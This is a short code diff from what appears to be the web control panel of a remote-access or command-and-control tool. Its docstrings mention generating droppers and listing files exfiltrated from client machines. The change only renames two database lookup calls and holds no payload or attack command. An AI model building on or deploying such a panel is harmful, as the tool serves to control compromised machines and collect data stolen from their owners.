@@ -38,7 +38,7 @@ def sessions():
 def payloads():
 	"""Page for creating custom client scripts. Custom client scripts are generated on this page by sending user inputted values to 
 	the '/generate' API endpoint, which writes the dropper to the user's output directory."""
-	payloads = payload_dao.get_payloads(current_user.id)
+	payloads = payload_dao.get_user_payloads(current_user.id)
 	return render_template("payloads.html", 
 							payloads=payloads, 
 							owner=current_user.username, 
@@ -49,7 +49,7 @@ def payloads():
 @login_required
 def files():
 	"""Page for displaying files exfiltrated from client machines"""
-	user_files = file_dao.get_files(current_user.id)
+	user_files = file_dao.get_user_files(current_user.id)
 	return render_template("files.html", 
 							files=user_files, 
 							owner=current_user.username, 
